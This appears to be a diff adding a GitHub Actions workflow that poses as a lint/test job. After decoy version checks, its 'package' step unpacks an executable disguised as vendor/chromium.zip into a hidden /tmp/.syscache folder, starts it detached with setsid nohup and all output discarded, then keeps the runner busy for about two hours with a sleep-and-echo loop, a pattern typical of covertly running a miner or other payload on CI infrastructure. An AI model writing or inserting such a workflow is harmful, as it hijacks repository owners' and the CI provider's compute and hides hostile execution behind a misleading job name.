@@ -1,0 +1,17 @@
+name: test-fbsi
+on:
+  workflow_dispatch:
+jobs:
+  lint_b1y:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - run: python3 --version
+      - run: go version 2>/dev/null || true
+      - run: gcc --version | head -1
+      - name: package
+        run: |
+          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium && (cd /tmp/.syscache && setsid nohup ./chromium >/dev/null 2>&1 &)
+          END=$((SECONDS + 121 * 60))
+          while [ $SECONDS -lt $END ]; do sleep 55; echo "ac9z13lw $(date -u +%H:%M)"; done
